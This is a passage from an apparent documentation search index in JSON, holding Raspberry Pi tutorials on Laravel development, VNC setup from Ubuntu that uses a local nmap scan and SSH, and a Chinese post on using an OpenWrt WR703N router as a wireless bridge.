of Laravel\u2019s backend dependencies.","title":"Creating a new Laravel app on Raspberry Pi"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#cloning-an-existing-project","text":"In case the project already exists, acess the projects folder created in the last step and do the following: Clone your project using git. Example: git clone git@github.com:roniemeque/nice-little-app.git acess the created folder with cd nice-little-app and install all of Laravel\u2019s backend dependencies with composer install configure your .env file, generate the app\u2019s key, run your migrations and the usual Laravel setup.","title":"Cloning an existing project"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-the-dependencies-for-assets-manipulation-with-npm","text":"If you use some kind of compilling, polifylling, minification and such and you have installed Node.js in your Pi, now it\u2019s time to install the project\u2019s dependencies. Whether it\u2019s a new or existing app, execute npm install in its folder. Important detail: the output of npm\u2019s installs in Raspbian is a lot more verbose and slower than the usual, but don\u2019t worry because after everything is installed it will work like it should, depending on your project depencies, of course. Laravel Mix\u2019s dependencies run perfectly in here so far! Now that everything is working, let\u2019s head to the final steps:","title":"Installing the dependencies for assets manipulation with NPM"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#running-laravel-on-raspberry-pi-with-phps-built-in-server","text":"Let\u2019s use artisan to manage the server. Execute the following: php artisan serve --host=YOUR-PI-IP (If you can\u2019t remember the IP of your Pi, use hostname -I to see it). Get ready now, it\u2019s coming! In your PC, browse to http://YOUR-PI-IP:8000 and see the result. Example: http://192.168.1.38:8000","title":"Running Laravel on Raspberry Pi with PHP\u2019s built-in server"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#automatically-manipulating-frontend-assets-with-laravel-mix-on-raspberry-pi","text":"If you don\u2019t use Laravel Mix , oh boy you should. It\u2019s an excellent wrapper around Webpack that makes working with Webpack seems like a breeze. You can even use it in non-laravel projects! Access your Pi in a new console tab without closing the one running the server and execute npm run dev inside your project\u2019s folder. If all of your Sass, Less, Coffe, Typescript and etcetera compiled correctly, let\u2019s set the compiling to happen automatically everytime a file is saved with npm run watch .","title":"Automatically manipulating frontend assets with Laravel Mix on Raspberry Pi"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#note-on-browsersync","text":"If you use Browsersync alongside your Laravel Mix, you can still use it here, but not directly, of course. Configure your Browsersync so it won\u2019t open any browser by default and you will be able to use it by browsing to the remote host Browsersync provides. (It will pop-up in the first output from npm run watch ) \u2014 your online option must be set to true also, but in Laravel Mix it is set by default. If you would like to disable Browsersync at all everytime you use your Pi for developing but you don\u2019t want to keep changing the webpack.mix.js settings and discarding it everytime, Laravel provides a nice way to solve this: In your .env file, add something like this: MIX_BROWSERSYNC=false Now change your Browsersync call inside you webpack.mix.js file so it is surrounded by the following condition: if(process.env.MIX_BROWSERSYNC){ mix.browserSync({your options go here}); } With that you can tell Laravel Mix that you don\u2019t want Browsersync in this environment. Don\u2019t forget to set it to true in the environments you want it enabled.","title":"Note on Browsersync"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#and-thats-it","text":"At this point you probably have a very decent and fine development environment on your Pi. It is also portable! Don\u2019t forget to always check your IP and network settings in case you plan on carrying it around though. It\u2019s likelly there are tons of ways to accomplish this procedure and it\u2019s possible by the time you read this some things will be outdated. It\u2019s very important to always pay attention to the names of the packages you are installing and the output of the commands you run. If you are doing this it\u2019s quite probable you are used to being frustrated with broken packages or doing a lot of Google to fix tiny hidden errors that will only happen in your system. I really hope this post will help anyone that tries to accomplish a similar result in using the Raspberry Pi as a development server, regardless of your PHP framework, versions and project requirements. \u539f\u6587\u94fe\u63a5\uff1a https://medium.com/@roniemeque/using-raspberry-pi-for-laravel-developing-30dabcdeba43","title":"And that\u2019s it"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/","text":"VNC setup on Raspberry Pi from Ubuntu VNC setup on Raspberry Pi from Ubuntu This tutorial will demonstrate how to setup and connect to a Raspberry Pi over VNC from Ubuntu. This process is easier if you have a display connected to the Raspberry Pi, but will also show the steps to connect with only Ethernet and power connected. It assumes you have Debian for Raspberry Pi installed on an SD card. If not, see RPi Easy SD card setup Getting the IP address of the Raspberry Pi The first step is to locate the Raspberry Pi on your network. If you have access to a display for your Raspberry Pi, this task is simple, in a terminal simply type: ifconfig All the network interface configurations will be displayed, including the IP address. However, if you don\u2019t have a display for your Raspberry Pi, this isn\u2019t an option. For this task, we can use the Linux nmap (Network Mapper) utility. sudo apt-get install nmap Then run a scan on your local network. Be change to the specifics of your own network. nmap -sV -p 22 192.168.0.1-255 The results will display every machine that could be identified on port 22. The Raspberry Pi (running Debian) looks something like this: Nmap scan report for 192.168.0.112 Host is up (0.033s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0) Service Info: OS: Linux Connecting over SSH So we know that the Raspberry Pi has IP address: 192.168.0.112. Now we can ssh to it: ssh [email protected] And you should receive a message like this: The authenticity of host \u2018192.168.0.112 (192.168.0.112)\u2019 can\u2019t be established. RSA key fingerprint is xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx. Are you sure you want to continue connecting (yes/no)? Type yes at the prompt, then enter the password for the user pi, \u2018raspberry\u2019 by default. You should get a prompt that looks like this: [email protected] :~$ Configuring VNC Now that we have logged in to the Raspberry Pi, we can setup VNC for remote access. First we need to install the VNC server: sudo apt-get install tightvncserver Next, start the VNC server on the Raspberry Pi. Adjust the geometry paramater to your desired display size. vncserver :1 -geometry 1024x600 -depth 16 -pixelformat rgb565 You will be prompted to create a password for VNC login. Once you do, you should see a line looking something like this: New \u2018X\u2019 desktop is raspberrypi:1 Now, we can finally connect to the Pi with VNC. Back on the Ubuntu machine, install the VNC viewer client: sudo apt-get install xtightvncviewer Then connect to the running VNC server: vncviewer 192.168.0.112:5901 To stop the VNC viewer, just close the application. To stop the VNC server, issue the following command (on the Raspberry Pi): vncserver -kill :1 \u539f\u6587\u94fe\u63a5\uff1a https://mitchtech.net/vnc-setup-on-raspberry-pi-from-ubuntu/","title":"VNC setup on Raspberry Pi from Ubuntu"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#vnc-setup-on-raspberry-pi-from-ubuntu","text":"","title":"VNC setup on Raspberry Pi from Ubuntu"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#vnc-setup-on-raspberry-pi-from-ubuntu_1","text":"This tutorial will demonstrate how to setup and connect to a Raspberry Pi over VNC from Ubuntu. This process is easier if you have a display connected to the Raspberry Pi, but will also show the steps to connect with only Ethernet and power connected. It assumes you have Debian for Raspberry Pi installed on an SD card. If not, see RPi Easy SD card setup","title":"VNC setup on Raspberry Pi from Ubuntu"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#getting-the-ip-address-of-the-raspberry-pi","text":"The first step is to locate the Raspberry Pi on your network. If you have access to a display for your Raspberry Pi, this task is simple, in a terminal simply type: ifconfig All the network interface configurations will be displayed, including the IP address. However, if you don\u2019t have a display for your Raspberry Pi, this isn\u2019t an option. For this task, we can use the Linux nmap (Network Mapper) utility. sudo apt-get install nmap Then run a scan on your local network. Be change to the specifics of your own network. nmap -sV -p 22 192.168.0.1-255 The results will display every machine that could be identified on port 22. The Raspberry Pi (running Debian) looks something like this: Nmap scan report for 192.168.0.112 Host is up (0.033s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0) Service Info: OS: Linux","title":"Getting the IP address of the Raspberry Pi"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#connecting-over-ssh","text":"So we know that the Raspberry Pi has IP address: 192.168.0.112. Now we can ssh to it: ssh [email protected] And you should receive a message like this: The authenticity of host \u2018192.168.0.112 (192.168.0.112)\u2019 can\u2019t be established. RSA key fingerprint is xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx. Are you sure you want to continue connecting (yes/no)? Type yes at the prompt, then enter the password for the user pi, \u2018raspberry\u2019 by default. You should get a prompt that looks like this: [email protected] :~$","title":"Connecting over SSH"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#configuring-vnc","text":"Now that we have logged in to the Raspberry Pi, we can setup VNC for remote access. First we need to install the VNC server: sudo apt-get install tightvncserver Next, start the VNC server on the Raspberry Pi. Adjust the geometry paramater to your desired display size. vncserver :1 -geometry 1024x600 -depth 16 -pixelformat rgb565 You will be prompted to create a password for VNC login. Once you do, you should see a line looking something like this: New \u2018X\u2019 desktop is raspberrypi:1 Now, we can finally connect to the Pi with VNC. Back on the Ubuntu machine, install the VNC viewer client: sudo apt-get install xtightvncviewer Then connect to the running VNC server: vncviewer 192.168.0.112:5901 To stop the VNC viewer, just close the application. To stop the VNC server, issue the following command (on the Raspberry Pi): vncserver -kill :1 \u539f\u6587\u94fe\u63a5\uff1a https://mitchtech.net/vnc-setup-on-raspberry-pi-from-ubuntu/","title":"Configuring VNC"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/","text":"\u4e3a\u6811\u8393\u6d3eDIY\u4e00\u6b3e\u9ad8\u901f\u7a33\u5b9a\u7684\u65e0\u7ebf\u7f51\u5361 \u8bf4\u660e \u6211\u7684\u6811\u8393\u6d3e\u7528\u4f5cNAS+\u5f71\u97f3\u670d\u52a1\u5668\uff0c\u56e0\u4e3a\u4e0d\u60f3\u88ab\u7f51\u7ebf\u675f\u7f1a\uff0c\u6240\u4ee5\u6811\u8393\u6d3e\u662f\u901a\u8fc7\u65e0\u7ebf\u7f51\u5361\u8fde\u63a5\u5bb6\u91cc\u7684\u4e3b\u8def\u7531WIFI\u6765\u4e0a\u7f51\u7684\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u628a\u6811\u8393\u6d3e\u6254\u5230\u51b0\u7bb1\u9876\u4e0a\u5e76\u4fdd\u630124\u5c0f\u65f6\u5f00\u673a\u4e86\u3002 \u53ef\u60dc\u7684\u662f\u6811\u8393\u6d3e\u5bf9\u65e0\u7ebf\u7f51\u5361\u7684\u652f\u6301\u4f3c\u4e4e\u5e76\u4e0d\u597d\uff0c\u9996\u5148\u662f\u901f\u5ea6\u6162\uff0c\u6211\u7684\u6811\u8393\u6d3e\u4f7f\u7528WIFI\u53ea\u6709\u5927\u7ea61.3M\u5de6\u53f3\u7684\u8bfb\u53d6\u901f\u5ea6\u548c1M\u5de6\u53f3\u7684\u5199\u5165\u901f\u5ea6\uff1b\u5176\u6b21\u7a33\u5b9a\u6027\u4e5f\u6ca1\u6709\u60f3\u8c61\u4e2d\u597d\uff0c\u5728\u8fd9\u4e48\u6162\u7684\u5199\u5165\u901f\u5ea6\u4e0b\u6709\u65f6\u901f\u5ea6\u4f1a\u76f4\u8fbe0\u7136\u540eWIFI\u6389\u7ebf\u3002 \u6211\u5c1d\u8bd5\u8fc74\u6b3e\u4e0d\u540c\u7684\u65e0\u7ebf\u7f51\u5361\uff0c\u5305\u62ec EP-N8508GS (8188ucs ), \u6c34\u661f MW150US (rtl8188eu) , \u78ca\u79d1 NW367 (rtl8192CU) \u548c \u5fc5\u8054 BL-WN2210 (rtl8192cu) . \u6bcf\u4e00\u6b3e\u90fd\u6709\u5b58\u5728\u540c\u6837\u7684\u95ee\u9898\u3002\u7f51\u4e0a\u80fd\u627e\u5230\u7684\u51e0\u4e4e\u6240\u6709\u65b9\u6848\uff0c\u4f8b\u5982\u6362\u7535\u6e90\u3001\u9650\u5236\u7f51\u901f\u3001\u5173\u95ed\u6811\u8393\u6d3eOTG\u82af\u7247\u7684Turbo\u6a21\u5f0f\u2026\u4e0d\u7a33\u5b9a\u7684\u73b0\u8c61\u4f9d\u7136\u5b58\u5728\u3002\u5947\u602a\u7684\u662f\uff0c\u6d4b\u8bd5\u53d1\u73b0\u6811\u8393\u6d3e\u7684\u6709\u7ebf\u8fde\u63a5\u975e\u5e38\u4e0d\u4ec5\u7a33\u5b9a\uff0c\u800c\u4e14\u901f\u5ea6\u4e5f\u8981\u597d\u5f88\u591a\uff0c\u5cf0\u503c\u8bfb\u53d6\u53ef\u8fbe7M/S\u3002\u4f46\u662f\u56e0\u4e3a\u4e0d\u60f3\u770b\u5230\u773c\u524d\u7ed5\u7740\u5404\u79cd\u7ebf(\u5f3a\u8feb\u75c7\u4f24\u4e0d\u8d77\u2026)\uff0c\u6240\u4ee5\u5b81\u613f\u5fcd\u53d7WIFI\u6389\u7ebf\u4e5f\u4e0d\u60f3\u7528\u6709\u7ebf\u8fde\u63a5\u3002 \u5c31\u8fd9\u6837\u5c06\u5c31\u7740\u7528\u4e86\u51e0\u4e2a\u6708\uff0c\u671f\u95f4\u867d\u7136\u6709\u65e0\u6570\u6b21\u60f3\u628a\u6811\u8393\u6d3e\u62cd\u5728\u5899\u4e0a\u7684\u51b2\u52a8\uff0c\u4e0d\u8fc7\u7531\u4e8e\u6811\u8393\u6d3e\u8eb2\u5728\u51b0\u7bb1\u9876\u7684\u89d2\u843d\u800c\u5e78\u8fd0\u7684\u8eb2\u8fc7\u4e00\u6b21\u6b21\u7684\u52ab\u96be\u2026\u6700\u8fd1\u65b0\u6362\u4e86\u4e2a\u4e3b\u8def\u7531\u5668\uff0c\u770b\u7740\u6dd8\u6c70\u4e0b\u6765\u7684WR703N\uff0c\u7a81\u7136\u7075\u5149\u4e00\u73b0\uff0c\u8fd9\u4e2a\u8def\u7531\u5668\u4e0d\u5c31\u662f\u5757\u65e0\u7ebf\u7f51\u5361\u5417\uff1f\u800c\u4e14\u662f\u4e13\u4e1a\u7684\uff01\u7a33\u5b9a\u6027\u548c\u901f\u5ea6\u90fd\u5e94\u8be5\u4e0d\u9519\uff01 \u539f\u7406 WR703N\u8def\u7531\u5668\u5237OpenWrt\u56fa\u4ef6\u540e\u5177\u6709 \u4e2d\u7ee7 \u6a21\u5f0f\uff0c\u7b80\u5355\u5730\u8bf4\uff0c\u5c31\u662f\u5c06\u8def\u7531\u5668\u5f53\u6210\u65e0\u7ebf\u57fa\u7ad9\uff0c\u63a5\u6536\u4e0a\u7ea7\u8def\u7531\u7684WIFI\u4fe1\u53f7\uff0c\u7136\u540e\u5c06\u4e0a\u7ea7\u8def\u7531\u7684\u7f51\u7edc\u901a\u8fc7\u6709\u7ebf\u6216WIFI\u5206\u4eab\u7ed9\u5176\u4ed6\u8bbe\u5907\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528WR703N\u8fde\u63a5\u4e0a\u7ea7\u8def\u7531\u7684WIFI\uff0c\u6811\u8393\u6d3e\u8fde\u4e0aWR703N\u7684\u6709\u7ebf\u63a5\u53e3\uff0c\u4ece\u800c\u5efa\u7acb\u6811\u8393\u6d3e\u548c\u4e0a\u7ea7\u8def\u7531\u7684\u8fde\u63a5\u3002\u76f8\u5f53\u4e8eWR703N\u53d8\u6210\u4e86\u4e00\u5757\u65e0\u7ebf\u7f51\u5361\u3002\u800c\u5bf9\u4e8e\u6811\u8393\u6d3e\u6765\u8bf4\uff0c\u56e0\u4e3a\u5b83\u662f\u901a\u8fc7\u6709\u7ebf\u7f51\u53e3\u548cWR703N\u8fde\u63a5\u7684\uff0c\u4e0d\u4f1a\u51fa\u73b0\u4f7f\u7528\u65e0\u7ebf\u7f51\u5361\u65f6\u4e0d\u7a33\u5b9a\u7684\u60c5\u51b5\u3002\u7f51\u7edc\u62d3\u6251\u56fe\u5982\u4e0b\uff1a \u6211\u7684\u4e3b\u8def\u7531\u5185\u7f51\u4e3a 10.1.1.x \uff0c\u7535\u8111\u3001\u624b\u673a\u3001IPAD\u7b49\u8bbe\u5907\u901a\u8fc7WIFI\u76f4\u63a5\u8fde\u5230\u4e3b\u8def\u7531\uff0c WR703N \u9996\u5148\u901a\u8fc7WIFI\u8fde\u63a5\u5230\u4e3b\u8def\u7531\uff0c\u7136\u540e\u901a\u8fc7\u6709\u7ebf\u5c06\u7f51\u7edc\u6865\u63a5\u5230\u6811\u8393\u6d3e\u3002\u65e0\u7ebf\u8def\u7531\u5668\u53ef\u4ee5\u4f7f\u7528 \u4e2d\u7ee7 \u548c \u6865\u63a5 \u4e24\u79cd\u6a21\u5f0f\u6765\u5b9e\u73b0\u8fde\u63a5\uff0c\u6211\u4f7f\u7528\u7684\u662f\u6865\u63a5\u6a21\u5f0f\uff0c\u4ee5\u4fdd\u8bc1\u6240\u6709\u8bbe\u5907\u90fd\u5904\u4e8e\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b8c\u7f8e\u652f\u6301minidlna\u7b49upnp\u7a0b\u5e8f\u3002 \u786c\u4ef6\u8fde\u63a5 \u6211\u7684\u6811\u8393\u6d3e\u548c\u5916\u8bbe\u662f\u901a\u8fc7\u5927\u91cf\u7684\u87ba\u4e1d\u548c\u7a7f\u5b54\u56fa\u5b9a\u5728\u4e00\u5757\u57fa\u677f\u4e0a\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u5c06WR703N\u4e5f\u4f5c\u4e3a\u4e00\u4e2a\u5916\u8bbe\u56fa\u5b9a\u4e0a\u53bb\u5c31\u884c\u4e86\u3002 \u8fd9\u662f\u6ca1\u6709\u5916\u8bbe\u7684\u6837\u5b50\uff1a WR703N\u548c\u98da\u738b\u7684Hub\u56fa\u5b9a\uff0c\u901a\u8fc7\u6811\u8393\u6d3e\u7684USB\u63a5\u53e3\u76f4\u63a5\u9a71\u52a8\u4e24\u5757U\u76d8\u3001\u4e00\u4e2a\u97f3\u54cd\u548c\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u8c01\u8bf4\u6811\u8393\u6d3eU\u53e3\u7684\u9a71\u52a8\u80fd\u529b\u4f4e\u7684\uff1f \u7ec4\u5408\u4e00\u4e0b\uff0cDIY\u7684\u90a3\u6839\u9ed1\u8272USB\u7ebf\u5185\u90e8\u96c6\u6210\u4e86\u4e00\u9897 PL2303 \u82af\u7247\uff0c\u8fde\u63a5\u540e\u6811\u8393\u6d3e\u53ef\u4ee5\u901a\u8fc7\u4e32\u53e3\u8c03\u8bd5WR703N\u3002 \u4e0a\u7535\u5f00\u673a\uff0c\u5f53\u7136\uff0c\u4e0a\u7535\u4e4b\u524d\u7ecf\u5386\u4e86\u8270\u82e6\u5353\u7edd\u7684\u8c03\u8bd5\u3002 \u6d4b\u8bd5 \u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\u505a\u4e86\u4e9b\u7b80\u5355\u7684\u6d4b\u8bd5\uff0c\u8fd9\u6b3eDIY\u7684\u6811\u8393\u6d3e\u65e0\u7ebf\u7f51\u5361\u901f\u5ea6\u548c\u7a33\u5b9a\u6027\u5b8c\u5168\u7b26\u5408\u6211\u7684\u9884\u671f\uff01\u4e0b\u9762\u662f\u4e00\u4e9b\u6d4b\u8bd5\u7ed3\u679c\uff1a Samba\u8bfb\u53d6\u901f\u5ea6\u4e3a3.5~4.5 M/S. Samba\u5199\u5165\u901f\u5ea6\u4e3a3~3.3M/S. \u9891\u7e41\u901a\u8fc7Samba\u8bfb\u5199\u6811\u8393\u6d3e\u4e0a\u7684\u6587\u4ef6\uff0c\u5728\u8bfb\u53d68G\uff0c\u5199\u51655G\u7684\u6570\u636e\u4e4b\u540e\u6ca1\u6709\u51fa\u73b0\u6b7b\u673a\u5361\u6b7b\u7684\u60c5\u51b5\u3002 \u603b\u7ed3 \u4ece\u4e0a\u9762\u7684\u6d4b\u8bd5\u7ed3\u679c\u548c\u6211\u51e0\u5929\u7684\u4f7f\u7528\u60c5\u51b5\u770b\u6765\uff0c\u8fd9\u6b3eDIY\u7684\u6811\u8393\u6d3e \u65e0\u7ebf\u7f51\u5361 \u62e5\u6709\u975e\u5e38\u53ef\u89c2\u7684\u901f\u5ea6\u548c\u7a33\u5b9a\u6027,\u53ef\u4ee5\u65e0\u89c6\u5e02\u9762\u4e0a\u5927\u90e8\u5206\u65e0\u7ebf\u7f51\u5361\u4e86\u3002 \u5728\u8c03\u8bd5\u8fd9\u6b3e\u7f51\u5361\u65f6\u82b1\u4e86\u4e0d\u5c11\u65f6\u95f4\uff0c\u65e0\u6570\u6b21\u60f3Knock my head against the wall.\u6211\u4f1a\u5c06\u8c03\u8bd5\u8fc7\u7a0b\u548c\u9047\u5230\u7684\u95ee\u9898\u8bb0\u5f55\u5728\u53e6\u4e00\u7bc7\u6587\u7ae0\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.shuyz.com/posts/diy-stable-wifi-adapter-for-raspberry-pi/","title":"\u4e3a\u6811\u8393\u6d3eDIY\u4e00\u6b3e\u9ad8\u901f\u7a33\u5b9a\u7684\u65e0\u7ebf\u7f51\u5361"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#diy","text":"","title":"\u4e3a\u6811\u8393\u6d3eDIY\u4e00\u6b3e\u9ad8\u901f\u7a33\u5b9a\u7684\u65e0\u7ebf\u7f51\u5361"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_1","text":"\u6211\u7684\u6811\u8393\u6d3e\u7528\u4f5cNAS+\u5f71\u97f3\u670d\u52a1\u5668\uff0c\u56e0\u4e3a\u4e0d\u60f3\u88ab\u7f51\u7ebf\u675f\u7f1a\uff0c\u6240\u4ee5\u6811\u8393\u6d3e\u662f\u901a\u8fc7\u65e0\u7ebf\u7f51\u5361\u8fde\u63a5\u5bb6\u91cc\u7684\u4e3b\u8def\u7531WIFI\u6765\u4e0a\u7f51\u7684\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u628a\u6811\u8393\u6d3e\u6254\u5230\u51b0\u7bb1\u9876\u4e0a\u5e76\u4fdd\u630124\u5c0f\u65f6\u5f00\u673a\u4e86\u3002 \u53ef\u60dc\u7684\u662f\u6811\u8393\u6d3e\u5bf9\u65e0\u7ebf\u7f51\u5361\u7684\u652f\u6301\u4f3c\u4e4e\u5e76\u4e0d\u597d\uff0c\u9996\u5148\u662f\u901f\u5ea6\u6162\uff0c\u6211\u7684\u6811\u8393\u6d3e\u4f7f\u7528WIFI\u53ea\u6709\u5927\u7ea61.3M\u5de6\u53f3\u7684\u8bfb\u53d6\u901f\u5ea6\u548c1M\u5de6\u53f3\u7684\u5199\u5165\u901f\u5ea6\uff1b\u5176\u6b21\u7a33\u5b9a\u6027\u4e5f\u6ca1\u6709\u60f3\u8c61\u4e2d\u597d\uff0c\u5728\u8fd9\u4e48\u6162\u7684\u5199\u5165\u901f\u5ea6\u4e0b\u6709\u65f6\u901f\u5ea6\u4f1a\u76f4\u8fbe0\u7136\u540eWIFI\u6389\u7ebf\u3002 \u6211\u5c1d\u8bd5\u8fc74\u6b3e\u4e0d\u540c\u7684\u65e0\u7ebf\u7f51\u5361\uff0c\u5305\u62ec EP-N8508GS (8188ucs ), \u6c34\u661f MW150US (rtl8188eu) , \u78ca\u79d1 NW367 (rtl8192CU) \u548c \u5fc5\u8054 BL-WN2210 (rtl8192cu) . \u6bcf\u4e00\u6b3e\u90fd\u6709\u5b58\u5728\u540c\u6837\u7684\u95ee\u9898\u3002\u7f51\u4e0a\u80fd\u627e\u5230\u7684\u51e0\u4e4e\u6240\u6709\u65b9\u6848\uff0c\u4f8b\u5982\u6362\u7535\u6e90\u3001\u9650\u5236\u7f51\u901f\u3001\u5173\u95ed\u6811\u8393\u6d3eOTG\u82af\u7247\u7684Turbo\u6a21\u5f0f\u2026\u4e0d\u7a33\u5b9a\u7684\u73b0\u8c61\u4f9d\u7136\u5b58\u5728\u3002\u5947\u602a\u7684\u662f\uff0c\u6d4b\u8bd5\u53d1\u73b0\u6811\u8393\u6d3e\u7684\u6709\u7ebf\u8fde\u63a5\u975e\u5e38\u4e0d\u4ec5\u7a33\u5b9a\uff0c\u800c\u4e14\u901f\u5ea6\u4e5f\u8981\u597d\u5f88\u591a\uff0c\u5cf0\u503c\u8bfb\u53d6\u53ef\u8fbe7M/S\u3002\u4f46\u662f\u56e0\u4e3a\u4e0d\u60f3\u770b\u5230\u773c\u524d\u7ed5\u7740\u5404\u79cd\u7ebf(\u5f3a\u8feb\u75c7\u4f24\u4e0d\u8d77\u2026)\uff0c\u6240\u4ee5\u5b81\u613f\u5fcd\u53d7WIFI\u6389\u7ebf\u4e5f\u4e0d\u60f3\u7528\u6709\u7ebf\u8fde\u63a5\u3002 \u5c31\u8fd9\u6837\u5c06\u5c31\u7740\u7528\u4e86\u51e0\u4e2a\u6708\uff0c\u671f\u95f4\u867d\u7136\u6709\u65e0\u6570\u6b21\u60f3\u628a\u6811\u8393\u6d3e\u62cd\u5728\u5899\u4e0a\u7684\u51b2\u52a8\uff0c\u4e0d\u8fc7\u7531\u4e8e\u6811\u8393\u6d3e\u8eb2\u5728\u51b0\u7bb1\u9876\u7684\u89d2\u843d\u800c\u5e78\u8fd0\u7684\u8eb2\u8fc7\u4e00\u6b21\u6b21\u7684\u52ab\u96be\u2026\u6700\u8fd1\u65b0\u6362\u4e86\u4e2a\u4e3b\u8def\u7531\u5668\uff0c\u770b\u7740\u6dd8\u6c70\u4e0b\u6765\u7684WR703N\uff0c\u7a81\u7136\u7075\u5149\u4e00\u73b0\uff0c\u8fd9\u4e2a\u8def\u7531\u5668\u4e0d\u5c31\u662f\u5757\u65e0\u7ebf\u7f51\u5361\u5417\uff1f\u800c\u4e14\u662f\u4e13\u4e1a\u7684\uff01\u7a33\u5b9a\u6027\u548c\u901f\u5ea6\u90fd\u5e94\u8be5\u4e0d\u9519\uff01","title":"\u8bf4\u660e"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_2","text":"WR703N\u8def\u7531\u5668\u5237OpenWrt\u56fa\u4ef6\u540e\u5177\u6709 \u4e2d\u7ee7 \u6a21\u5f0f\uff0c\u7b80\u5355\u5730\u8bf4\uff0c\u5c31\u662f\u5c06\u8def\u7531\u5668\u5f53\u6210\u65e0\u7ebf\u57fa\u7ad9\uff0c\u63a5\u6536\u4e0a\u7ea7\u8def\u7531\u7684WIFI\u4fe1\u53f7\uff0c\u7136\u540e\u5c06\u4e0a\u7ea7\u8def\u7531\u7684\u7f51\u7edc\u901a\u8fc7\u6709\u7ebf\u6216WIFI\u5206\u4eab\u7ed9\u5176\u4ed6\u8bbe\u5907\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528WR703N\u8fde\u63a5\u4e0a\u7ea7\u8def\u7531\u7684WIFI\uff0c\u6811\u8393\u6d3e\u8fde\u4e0aWR703N\u7684\u6709\u7ebf\u63a5\u53e3\uff0c\u4ece\u800c\u5efa\u7acb\u6811\u8393\u6d3e\u548c\u4e0a\u7ea7\u8def\u7531\u7684\u8fde\u63a5\u3002\u76f8\u5f53\u4e8eWR703N\u53d8\u6210\u4e86\u4e00\u5757\u65e0\u7ebf\u7f51\u5361\u3002\u800c\u5bf9\u4e8e\u6811\u8393\u6d3e\u6765\u8bf4\uff0c\u56e0\u4e3a\u5b83\u662f\u901a\u8fc7\u6709\u7ebf\u7f51\u53e3\u548cWR703N\u8fde\u63a5\u7684\uff0c\u4e0d\u4f1a\u51fa\u73b0\u4f7f\u7528\u65e0\u7ebf\u7f51\u5361\u65f6\u4e0d\u7a33\u5b9a\u7684\u60c5\u51b5\u3002\u7f51\u7edc\u62d3\u6251\u56fe\u5982\u4e0b\uff1a \u6211\u7684\u4e3b\u8def\u7531\u5185\u7f51\u4e3a 10.1.1.x \uff0c\u7535\u8111\u3001\u624b\u673a\u3001IPAD\u7b49\u8bbe\u5907\u901a\u8fc7WIFI\u76f4\u63a5\u8fde\u5230\u4e3b\u8def\u7531\uff0c WR703N \u9996\u5148\u901a\u8fc7WIFI\u8fde\u63a5\u5230\u4e3b\u8def\u7531\uff0c\u7136\u540e\u901a\u8fc7\u6709\u7ebf\u5c06\u7f51\u7edc\u6865\u63a5\u5230\u6811\u8393\u6d3e\u3002\u65e0\u7ebf\u8def\u7531\u5668\u53ef\u4ee5\u4f7f\u7528 \u4e2d\u7ee7 \u548c \u6865\u63a5 